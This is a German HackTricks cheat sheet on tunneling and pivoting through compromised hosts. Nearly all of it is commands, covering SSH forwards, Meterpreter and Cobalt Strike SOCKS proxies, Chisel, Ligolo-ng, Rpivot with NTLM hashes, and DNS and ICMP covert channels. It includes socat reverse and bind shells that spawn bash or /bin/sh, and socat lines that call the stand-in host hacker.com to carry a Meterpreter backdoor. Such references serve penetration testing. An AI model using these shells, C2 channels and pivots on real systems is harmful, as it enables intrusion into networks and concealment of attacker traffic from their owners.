# Tunneling und Portweiterleitung

{% hint style="success" %}
Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstütze HackTricks</summary>

* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

## Nmap-Tipp

{% hint style="warning" %}
**ICMP**- und **SYN**-Scans können nicht durch Socks-Proxys getunnelt werden, daher müssen wir **Ping-Discovery deaktivieren** (`-Pn`) und **TCP-Scans** (`-sT`) angeben, damit dies funktioniert.
{% endhint %}

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH grafische Verbindung (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

Öffnen Sie neuen Port im SSH-Server --> Anderer Port
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Lokaler Port --> Kompromittierter Host (SSH) --> Dritte\_Box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Lokaler Port --> Kompromittierter Host (SSH) --> Überall
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

Dies ist nützlich, um Reverse-Shells von internen Hosts über eine DMZ zu Ihrem Host zu erhalten:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Sie benötigen **Root-Rechte auf beiden Geräten** (da Sie neue Schnittstellen erstellen werden) und die sshd-Konfiguration muss Root-Login erlauben:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
```
Aktivieren Sie das Forwarding auf der Server-Seite
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Setzen Sie eine neue Route auf der Client-Seite
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
## SSHUTTLE

Sie können **tunneln** über **ssh** den gesamten **Verkehr** zu einem **Subnetz** über einen Host.\
Zum Beispiel, den gesamten Verkehr, der zu 10.10.10.0/24 geht, weiterleiten.
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Mit einem privaten Schlüssel verbinden
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Lokaler Port --> Kompromittierter Host (aktive Sitzung) --> Dritte\_Box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Eine andere Möglichkeit:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS-Proxy

Öffnen Sie einen Port im Teamserver, der an allen Schnittstellen lauscht und verwendet werden kann, um **den Verkehr durch das Beacon zu leiten**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

{% hint style="warning" %}
In diesem Fall wird der **Port im Beacon-Host geöffnet**, nicht im Team-Server, und der Verkehr wird an den Team-Server gesendet und von dort an den angegebenen Host:Port.
{% endhint %}
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Zu beachten:

- Beacons Reverse-Port-Forwarding ist dafür ausgelegt, **Verkehr zum Team-Server zu tunneln, nicht um zwischen einzelnen Maschinen weiterzuleiten**.
- Der Verkehr wird **innerhalb des C2-Verkehrs von Beacon getunnelt**, einschließlich P2P-Links.
- **Admin-Rechte sind nicht erforderlich**, um Reverse-Port-Forwarding auf hohen Ports zu erstellen.

### rPort2Port lokal

{% hint style="warning" %}
In diesem Fall wird der **Port im Beacon-Host geöffnet**, nicht im Team-Server, und der **Verkehr wird an den Cobalt Strike-Client gesendet** (nicht an den Team-Server) und von dort an den angegebenen Host:Port.
{% endhint %}
```
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Sie müssen eine Webdatei hochladen: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Sie können es von der Release-Seite von [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) herunterladen.\
Sie müssen die **gleiche Version für Client und Server verwenden**.

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Portweiterleitung
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**Verwenden Sie dieselbe Version für Agent und Proxy**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Agent Binding und Listening
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Reverse-Tunnel. Der Tunnel wird vom Opfer gestartet.\
Ein socks4-Proxy wird auf 127.0.0.1:1080 erstellt.
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot durch **NTLM-Proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind-Shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse-Shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port über Socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter über SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Sie können einen **nicht-authentifizierten Proxy** umgehen, indem Sie diese Zeile anstelle der letzten in der Konsole des Opfers ausführen:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh Konsole**

Erstellen Sie Zertifikate auf beiden Seiten: Client und Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Verbinde den lokalen SSH-Port (22) mit dem 443-Port des Angreiferhosts
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Es ist wie eine Konsolen-PuTTY-Version (die Optionen sind sehr ähnlich zu einem ssh-Client).

Da dieses Binary auf dem Opfer ausgeführt wird und es sich um einen ssh-Client handelt, müssen wir unseren ssh-Dienst und -Port öffnen, damit wir eine umgekehrte Verbindung haben können. Dann, um nur einen lokal zugänglichen Port auf einen Port in unserer Maschine weiterzuleiten:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Sie müssen ein lokaler Administrator sein (für jeden Port)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Sie müssen **RDP-Zugriff über das System** haben.\
Herunterladen:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Dieses Tool verwendet `Dynamic Virtual Channels` (`DVC`) aus der Remote Desktop Service-Funktion von Windows. DVC ist verantwortlich für **das Tunneln von Paketen über die RDP-Verbindung**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Laden Sie in Ihrem Client-Computer **`SocksOverRDP-Plugin.dll`** so:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Jetzt können wir uns über **RDP** mit dem **Opfer** verbinden, indem wir **`mstsc.exe`** verwenden, und wir sollten eine **Aufforderung** erhalten, die besagt, dass das **SocksOverRDP-Plugin aktiviert ist** und es auf **127.0.0.1:1080** **lauschen** wird.

**Verbinden** Sie sich über **RDP** und laden Sie die `SocksOverRDP-Server.exe`-Binärdatei auf dem Opfercomputer hoch und führen Sie sie aus:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Jetzt bestätigen Sie auf Ihrer Maschine (Angreifer), dass der Port 1080 lauscht:
```
netstat -antb | findstr 1080
```
Jetzt können Sie [**Proxifier**](https://www.proxifier.com/) **verwenden, um den Datenverkehr über diesen Port zu proxyen.**

## Windows GUI-Apps proxifizieren

Sie können Windows GUI-Apps dazu bringen, über einen Proxy zu navigieren, indem Sie [**Proxifier**](https://www.proxifier.com/) verwenden.\
In **Profil -> Proxy-Server** fügen Sie die IP und den Port des SOCKS-Servers hinzu.\
In **Profil -> Proxifizierungsregeln** fügen Sie den Namen des Programms hinzu, das proxifiziert werden soll, und die Verbindungen zu den IPs, die Sie proxifizieren möchten.

## NTLM-Proxy-Umgehung

Das zuvor erwähnte Tool: **Rpivot**\
**OpenVPN** kann dies ebenfalls umgehen, indem Sie diese Optionen in der Konfigurationsdatei festlegen:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Es authentifiziert sich gegen einen Proxy und bindet einen Port lokal, der an den externen Dienst weitergeleitet wird, den Sie angeben. Dann können Sie das Tool Ihrer Wahl über diesen Port verwenden.\
Zum Beispiel, um Port 443 weiterzuleiten.
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Jetzt, wenn Sie beispielsweise im Opfer den **SSH**-Dienst so einstellen, dass er auf Port 443 lauscht. Sie können sich über den Angreifer-Port 2222 mit ihm verbinden.\
Sie könnten auch einen **meterpreter** verwenden, der sich mit localhost:443 verbindet und der Angreifer auf Port 2222 lauscht.

## YARP

Ein Reverse-Proxy, der von Microsoft erstellt wurde. Sie finden ihn hier: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Root wird in beiden Systemen benötigt, um tun-Adapter zu erstellen und Daten zwischen ihnen über DNS-Abfragen zu tunneln.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Der Tunnel wird sehr langsam sein. Sie können eine komprimierte SSH-Verbindung durch diesen Tunnel erstellen, indem Sie Folgendes verwenden:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Hier herunterladen**](https://github.com/iagox86/dnscat2)**.**

Stellt einen C\&C-Kanal über DNS her. Es benötigt keine Root-Rechte.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **In PowerShell**

Sie können [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) verwenden, um einen dnscat2-Client in PowerShell auszuführen:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Portweiterleitung mit dnscat**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Ändern Sie den DNS von Proxychains

Proxychains intercepts `gethostbyname` libc call und tunnelt TCP-DNS-Anfragen durch den SOCKS-Proxy. Standardmäßig ist der DNS-Server, den Proxychains verwendet, **4.2.2.2** (fest codiert). Um ihn zu ändern, bearbeiten Sie die Datei: _/usr/lib/proxychains3/proxyresolv_ und ändern Sie die IP. Wenn Sie sich in einer Windows-Umgebung befinden, können Sie die IP des **Domain Controllers** festlegen.

## Tunnel in Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

## ICMP-Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Root wird in beiden Systemen benötigt, um TUN-Adapter zu erstellen und Daten zwischen ihnen mithilfe von ICMP-Echo-Anfragen zu tunneln.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Lade es hier herunter**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

**[ngrok](https://ngrok.com/) ist ein Tool, um Lösungen mit einem einzigen Befehl ins Internet zu exponieren.**
*Expositions-URI sind wie:* **UID.ngrok.io**

### Installation

- Erstellen Sie ein Konto: https://ngrok.com/signup
- Client-Download:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Grundlegende Anwendungen

**Dokumentation:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

*Es ist auch möglich, Authentifizierung und TLS hinzuzufügen, falls erforderlich.*

#### Tunneling TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Dateien mit HTTP freigeben
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing HTTP calls

*Nützlich für XSS, SSRF, SSTI ...*  
Direkt von stdout oder in der HTTP-Schnittstelle [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunneling internal HTTP service
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml einfaches Konfigurationsbeispiel

Es öffnet 3 Tunnel:
- 2 TCP
- 1 HTTP mit statischer Dateiexposition von /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Andere Tools zur Überprüfung

* [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
* [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

{% hint style="success" %}
Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstützen Sie HackTricks</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
